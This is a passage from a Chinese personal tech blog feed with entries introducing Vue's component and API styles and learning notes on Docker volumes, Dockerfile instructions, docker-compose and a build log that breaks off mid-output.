        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="什么是Vue？"><a href="#什么是Vue？" class="headerlink" title="什么是Vue？"></a>什么是Vue？</h3><p>Vue (发音为 &#x2F;vjuː&#x2F;，类似<strong>view</strong><br>) 是一款用于构建用户界面的 JavaScript 框架。它基于标准 HTML、CSS 和 JavaScript<br>构建，并提供了一套声明式的、组件化的编程模型，帮助你高效地开发用户界面。无论是简单还是复杂的界面，Vue 都可以胜任。</p><p>示例</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createApp&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">createApp</span>(&#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;button @click=&quot;count++&quot;&gt;</span><br><span class="line">    Count is: &#123;&#123; count &#125;&#125;</span><br><span class="line">  &lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>vue的两个核心功能：</p><ul><li><strong>声明式渲染</strong>：Vue 基于标准 HTML 拓展了一套模板语法，使得我们可以声明式地描述最终输出的 HTML 和 JavaScript 状态之间的关系。</li><li><strong>响应性</strong>：Vue 会自动跟踪 JavaScript 状态并在其发生变化时响应式地更新 DOM。</li></ul><h3 id="渐进式框架"><a href="#渐进式框架" class="headerlink" title="渐进式框架"></a>渐进式框架</h3><p>Vue 是一个框架，也是一个生态。其功能覆盖了大部分前端开发常见的需求。但 Web 世界是十分多样化的，不同的开发者在 Web<br>上构建的东西可能在形式和规模上会有很大的不同。考虑到这一点，Vue 的设计非常注重灵活性和“可以被逐步集成”这个特点。根据你的需求场景，你可以用不同的方式使用<br>Vue：</p><ul><li>无需构建步骤，渐进式增强静态的 HTML</li><li>在任何页面中作为 Web Components 嵌入</li><li>单页应用 (SPA)</li><li>全栈 &#x2F; 服务端渲染 (SSR)</li><li>Jamstack &#x2F; 静态站点生成 (SSG)</li><li>开发桌面端、移动端、WebGL，甚至是命令行终端中的界面</li></ul><h3 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件"></a>单文件组件</h3><p>.vue文件称为单文件组件，顾名思义，Vue 的单文件组件会将一个组件的逻辑 (JavaScript)，模板 (HTML) 和样式 (CSS) 封装在同一个文件里。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">count</span>: <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;count++&quot;</span>&gt;</span>Count is: &#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">button</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="API风格"><a href="#API风格" class="headerlink" title="API风格"></a>API风格</h3><p>Vue的组件可以按两种不同的风格书写：<strong>选项式 API</strong>和<strong>组合式 API。</strong></p><h4 id="选项式API-Options-API"><a href="#选项式API-Options-API" class="headerlink" title="选项式API (Options API)"></a>选项式API (Options API)</h4><p>使用选项式API，我们可以用包含多个选项的对象来描述组件的逻辑，例如<code>data</code>、<code>methods</code>和<code>mounted</code>。选项所定义的属性都会暴露在函数内部的<br><code>this</code>上，它会指向当前的组件实例。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> &lt;script&gt;</span><br><span class="line">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="comment">// data() 返回的属性将会成为响应式的状态</span></span><br><span class="line">    <span class="comment">// 并且暴露在 `this` 上</span></span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// methods 是一些用来更改状态与触发更新的函数</span></span><br><span class="line">    <span class="comment">// 它们可以在模板中作为事件监听器绑定</span></span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">count</span>++</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生命周期钩子会在组件生命周期的各个不同阶段被调用</span></span><br><span class="line">    <span class="comment">// 例如这个函数就会在组件挂载完成后被调用</span></span><br><span class="line">    <span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`The initial count is <span class="subst">$&#123;<span class="variable language_">this</span>.count&#125;</span>.`</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    @<span class="attr">click</span>=<span class="string">&quot;increment&quot;</span>&gt;</span>Count is: &#123;&#123;count&#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="组合式-API-Composition-API"><a href="#组合式-API-Composition-API" class="headerlink" title="组合式 API (Composition API)"></a><strong>组合式 API (Composition API)</strong></h4><p>通过组合式API，我们可以使用导入的API函数来描述组件逻辑。在单文件中，组合式API通常会与<code>&lt;script setup&gt;</code> 搭配使用。这个<code>setup</code><br>attribute 是一个标识，告诉Vue需要在编译时进行一些处理，让我们可以更简洁使用组合式API。比如比如，<code>&lt;script setup&gt;</code><br>中的导入和顶层变量&#x2F;函数都能够在模板中直接使用。</p><p>下面是使用了组合式 API 与<code>&lt;script setup&gt;</code>改造后和上面的模板完全一样的组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">    <span class="keyword">import</span> &#123;ref, onMounted&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 响应式状态</span></span><br><span class="line">    <span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用来修改状态、触发更新的函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span><br><span class="line">    count.<span class="property">value</span>++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生命周期钩子</span></span><br><span class="line">    <span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`The initial count is <span class="subst">$&#123;count.value&#125;</span>.`</span>)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    @<span class="attr">click</span>=<span class="string">&quot;increment&quot;</span>&gt;</span>Count is: &#123;&#123;count&#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker学习</title>
      <link href="/2023/01/13/docker%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/01/13/docker%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="数据挂载"><a href="#数据挂载" class="headerlink" title="数据挂载"></a>数据挂载</h1><p>docker提供两种将数据从宿主机挂载到容器中：</p><ul><li>volumes:将docker的文件系统挂载到<code>/var/lib/docker/volumes</code></li><li>bind mounts:将宿主机上的任意位置的文件或目录挂载到容器中</li></ul><h3 id="volumes示例："><a href="#volumes示例：" class="headerlink" title="volumes示例："></a>volumes示例：</h3><ol><li><p>创建数据卷</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker volume create nginx-vol</span><br><span class="line">docker volume <span class="built_in">ls</span></span><br><span class="line">docker volume inspect nginx-vol</span><br></pre></td></tr></table></figure></li><li><p>使用数据卷</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=nginx-test --mount src=nginx-vol,dst=/usr/share/nginx/html nginx</span><br><span class="line">docekr run -d --name=nginx-test -v nginx-vol:/usr/share/nginx/html nginx</span><br></pre></td></tr></table></figure></li></ol><h3 id="bind-mount示例："><a href="#bind-mount示例：" class="headerlink" title="bind mount示例："></a>bind mount示例：</h3><ol><li><p>挂载宿主机目录到容器</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=nginx-test --mount <span class="built_in">type</span>=<span class="built_in">bind</span>,src</span><br><span class="line">docker volume <span class="built_in">ls</span></span><br><span class="line">docker volume inspect nginx-vol</span><br></pre></td></tr></table></figure></li><li><p>使用数据卷</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=nginx-test --mount src=nginx-vol,dst=/usr/share/nginx/html nginx</span><br><span class="line">docekr run -d --name=nginx-test -v nginx-vol:/usr/share/nginx/html nginx</span><br></pre></td></tr></table></figure></li></ol><h1 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h1><p>常使用的指令</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置基础镜像</span></span><br><span class="line">FORM</span><br><span class="line"><span class="comment"># 设置基础镜像</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># RUN有两个格式</span></span></span><br><span class="line"><span class="comment"># RUN &lt;command&gt; (shell 格式，linux默认使用/bin/sh windows默认使用cmd /S /C)</span></span><br><span class="line"><span class="comment"># RUN /bin/bash -c &#x27;echo WJLab&#x27;</span></span><br><span class="line"><span class="comment"># RUN [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]</span></span><br><span class="line"><span class="comment"># RUN [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;echo WJLab&quot;]</span></span><br><span class="line"><span class="comment"># Windows命令 需要多反斜杠进行转义</span></span><br><span class="line"><span class="comment"># RUN [&quot;c:\\windows\\system32\\tasklist.exe&quot;]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># 每个dockerfile文件中只能有一个CMD指令</span></span></span><br><span class="line"><span class="comment"># 当存在多个CMD时，只有最后一个会生效</span></span><br><span class="line"><span class="comment"># CMD command param1 param2 (shell 格式)</span></span><br><span class="line"><span class="comment"># CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;] (exec格式, 推荐格式)</span></span><br><span class="line"><span class="comment"># CMD [&quot;param1&quot;,&quot;param2&quot;] </span></span><br><span class="line"><span class="comment"># 参数必须使用双引号</span></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...</span></span></span><br><span class="line"><span class="keyword">EXPOSE</span></span><br><span class="line"><span class="comment"># EXPOSE &lt;port&gt; [&lt;port&gt;/&lt;protocol&gt;...]</span></span><br><span class="line"><span class="comment"># 设置容器指定监听地址</span></span><br><span class="line"><span class="keyword">ENV</span></span><br><span class="line"><span class="comment"># 设置环境变量</span></span><br><span class="line"><span class="comment"># ENV MY_CAT=fluffy</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># 设置添加文件所属用户</span></span></span><br><span class="line"><span class="comment"># ADD [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;src&gt;&quot;,... &quot;&lt;dest&gt;&quot;]</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;src&gt;&quot;,... &quot;&lt;dest&gt;&quot;]</span></span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># 和CMD一样也有两种格式，容器启动后执行的命令</span></span></span><br><span class="line"><span class="comment"># ENTRYPOINT [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]</span></span><br><span class="line"><span class="comment"># ENTRYPOINT command param1 param2</span></span><br><span class="line">VLOUME</span><br><span class="line"><span class="comment"># 磁盘挂载</span></span><br><span class="line"><span class="keyword">USER</span></span><br><span class="line"><span class="comment"># 设置容器内启动用户</span></span><br><span class="line"><span class="comment"># USER &lt;user&gt;[:&lt;group&gt;] </span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># WORKDIR指令为Dockerfile中跟随它的任何RUN、CMD、ENTRYPOINT、COPY和ADD指令设置工作目录</span></span></span><br><span class="line"><span class="comment"># WORKDIR/path/to/workdir</span></span><br><span class="line"><span class="keyword">SHELL</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># 设置Shell</span></span></span><br></pre></td></tr></table></figure><h1 id="Docker-Compose使用"><a href="#Docker-Compose使用" class="headerlink" title="Docker Compose使用"></a>Docker Compose使用</h1><p>Docker Compose使用YAML文件来定义多服务的应用。YAML是JSON的一个子集。</p><p>Docker Compose默认使用文件名docker-compose.yml，用户也可以使用-f参数指定具体文件。</p><p>Compose文件示例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Compose文件部署一个小型Flask应用</span></span><br><span class="line"><span class="comment"># 文件的基本结构包含四个一级Key: version、services、networks、volumes</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.5&#x27;</span> <span class="comment"># 必须指定，定义了Compose文件格式(主要是API)，并非是docker等软件版本，也不是镜像版本</span></span><br><span class="line"><span class="attr">services:</span> <span class="comment"># 定义不同的应用服务，并使用对应key去创建容器</span></span><br><span class="line">  <span class="attr">web-fe:</span> <span class="comment"># web前端服务</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">../../../../Downloads/2ca795e5-bcc5-454b-b86b-66d898441190_Export-7e8b8b0a-9a64-4e0c-a809-9be4e17806bb/intBJW</span> <span class="string">5474d6448d824f288be5e0ee64b225e2</span> <span class="comment"># 指定Docker基于当前目录(.)下的Dockerfile中的定义指令来构建一个新镜像，这个镜像会被用于启动该服务的容器</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">python</span> <span class="string">app.py</span> <span class="comment"># 指定Docker容器中名为app.py的Python脚本作为主程序吗，当然，此镜像中必须包括app.py文件以及Python(Dockerfile) 可以覆盖Dockerfile中的CMD命令</span></span><br><span class="line">    <span class="attr">ports:</span> <span class="comment"># 定义端口</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">target:</span> <span class="number">5000</span> <span class="comment"># 容器内端口</span></span><br><span class="line">        <span class="attr">published:</span> <span class="number">5000</span> <span class="comment"># 发布端口=宿主机端口</span></span><br><span class="line">    <span class="attr">networks:</span> <span class="comment"># 将web连接到指定的网络上</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">counter-net</span></span><br><span class="line">    <span class="attr">volumes:</span> <span class="comment"># 指定数据卷 </span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">volume</span> <span class="comment"># 数据卷类型</span></span><br><span class="line">        <span class="attr">source:</span> <span class="string">counter-volume</span> <span class="comment"># 数据卷(宿主机)</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/code</span> <span class="comment"># 容器内路径</span></span><br><span class="line">  <span class="attr">redis:</span> <span class="comment"># redis服务</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;redis:alpine&quot;</span> <span class="comment"># 指定镜像，该镜像会从Docker Hub中拉取下来</span></span><br><span class="line">    <span class="attr">networks:</span> <span class="comment"># 将redis连接到指定网络上</span></span><br><span class="line">      <span class="attr">counter-net:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span> <span class="comment"># 用于指引Docker创建新的网络</span></span><br><span class="line">  <span class="attr">counter-net:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span> <span class="comment"># 用于指引Docker创建新的数据卷</span></span><br><span class="line">  <span class="attr">counter-vol:</span></span><br></pre></td></tr></table></figure><p>使用docker-compose部署应用</p><p>文件目录：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ubuntu@ubuntu:~/docker/counter-app-master$</span> <span class="string">ls</span></span><br><span class="line"><span class="string">app.py</span>  <span class="string">docker-compose.yml</span>  <span class="string">Dockerfile</span>  <span class="string">README.md</span>  <span class="string">requirements.txt</span></span><br></pre></td></tr></table></figure><ul><li><a href="http://app.py/">app.py</a> 应用程序代码</li><li>docker-compose.yml是Compose文件，定义docker服务怎么部署应用</li><li>Dockerfile定义如何构建web-fe服务所使用的镜像</li><li>requirements.txt 列出了应用所依赖的Python包</li></ul><p>部署中出现的问题：</p><p>使用pip安装python库时出现网络问题，安装报错</p><p>删除<code>/etc/docker/daemon.json</code> 后安装成功</p><p>构建springboot镜像的Dockerfile示例：</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> intbjw</span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> ./target/dockerdemo-0.0.1-SNAPSHOT.jar app.jar</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="language-bash"> /code</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> bash -c <span class="string">&#x27;touch /app.jar&#x27;</span></span></span><br><span class="line"><span class="comment"># 用于设定容器启动时第一个运行的命令及器参数</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>,<span class="string">&quot;-Djava.security.egd=file:/dev/./urandom&quot;</span>,<span class="string">&quot;-jar&quot;</span>,<span class="string">&quot;/app.jar&quot;</span>]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件放在容器中的&#x2F;docker-entrypoint-initdb.d&#x2F; 目录，在容器第一次启动时执行，之后重启容器不会重复执行。有时会出现权限不对的情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/intbjw/docker/WJC2# docker-compose -f mongo.yml up</span><br><span class="line">Starting mongodb ... <span class="keyword">done</span></span><br><span class="line">Attaching to mongodb</span><br><span class="line">mongodb    | /usr/local/bin/docker-entrypoint.sh: line 385: /docker-entrypoint-initdb.d/mongo-init.sh: Permission denied</span><br><span class="line">mongodb exited with code 1</span><br></pre></td></tr></table></figure><p>构建镜像时，终端输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">~/IdeaProjects/dockerdemo ⌚ 10:10:58</span><br><span class="line">$ docker build -t  web:1.0 .</span><br><span class="line">[+] Building 191.7s (9/9) FINISHED                                                                                                                                                                                                                                                                                      </span><br><span class="line"> =&gt; [internal] load build definition from Dockerfile                                                                                                                                                                                                                                                               0.1s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 250B                                                                                                                                                                                                                                                                               0.0s</span><br><span class="line"> =&gt; [internal] load .dockerignore                                                                                                                                                                                                                                                                                  0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 2B                                                                                                                                                                                                                                                                                    0.0s</span><br><span class="line"> =&gt; [internal] load metadata <span class="keyword">for</span> docker.io/library/openjdk:8                                                                                                                                                                                                                                                      45.7s</span><br><span class="line"> =&gt; [internal] load build context                                                                                                                                                                                                                                                                                  0.4s</span><br><span class="line"> =&gt; =&gt; transferring context: 17.56MB                                                                                                                                                                                                                                                                               0.4s</span><br><span class="line"> =&gt; [1/3] FROM docker.io/library/openjdk:8@sha256:208812d8c45e0f5cb51c35b143094bd28322bad83ec8e463a1cbe3c5a6308b1f                                                                                                                                                                                               134.0s</span><br><span class="line"> =&gt; =&gt; resolve docker.io/library/openjdk:8@sha256:208812d8c45e0f5cb51c35b143094bd28322bad83ec8e463a1cbe3c5a6308b1f                                                                                                                                                                                                11.2s</span><br><span class="line"> =&gt; =&gt; sha256:47482c603b2a221f7f968380801639c3d108d18d33d77c93d44cfe8953c90548 7.81kB / 7.81kB                                                                                                                                                                                                                     0.0s</span><br><span class="line"> =&gt; =&gt; sha256:412caad352a3ecbb29c080379407ae0761e7b9b454f7239cbfd1d1da25e06b29 5.15MB / 5.15MB                                                                                                                                                                                                                    38.3s</span><br><span class="line"> =&gt; =&gt; sha256:208812d8c45e0f5cb51c35b143094bd28322bad83ec8e463a1cbe3c5a6308b1f 1.04kB / 1.04kB                                                                                                                                                                                                                     0.0s</span><br><span class="line"> =&gt; =&gt; sha256:93227b5ffb978363dfa3d493a0d25ccc943405260865437660bfec2af3174a73 1.79kB / 1.79kB                                                                                                                                                                                                                     0.0s</span><br><span class="line"> =&gt; =&gt; sha256:0c6b8ff8c37e92eb1ca65ed8917e818927d5bf318b6f18896049b5d9afc28343 54.92MB / 54.92MB                                                                                                                                                                                                                  60.0s</span><br><span class="line"> =&gt; =&gt; sha256:e6d3e61f7a504fa66d7275123969e9917570188650eb84b2280a726b996040f6 10.87MB / 10.87MB                                                                                                                                                                                                                  43.8s</span><br><span class="line"> =&gt; =&gt; sha256:461bb1d8c517c7f9fc0f1df66c9dc34c85a23421c1e1c540b2e28cbb258e75f5 54.57MB / 54.57MB                                                                                                                                                                                                                  95.2s</span><br><span class="line"> =&gt; =&gt; sha256:e442ee9d8dd9896a5b3b67117060f2af4ae8e997af7297009e7d0ea4b6595163 5.42MB / 5.42MB                                                                                                                                                                                                                    74.9s</span><br><span class="line"> =&gt; =&gt; sha256:36b5bcea956cbbcc7e16356354d5eb4b5b3834a43d708ca6c3fd048f33ddc579 211B / 211B                                                                                                                                                                                                                        88.1s</span><br><span class="line"> =&gt; =&gt; extracting sha256:0c6b8ff8c37e92eb1ca65ed8917e818927d5bf318b6f18896049b5d9afc28343                                                                                                                                                                                                                          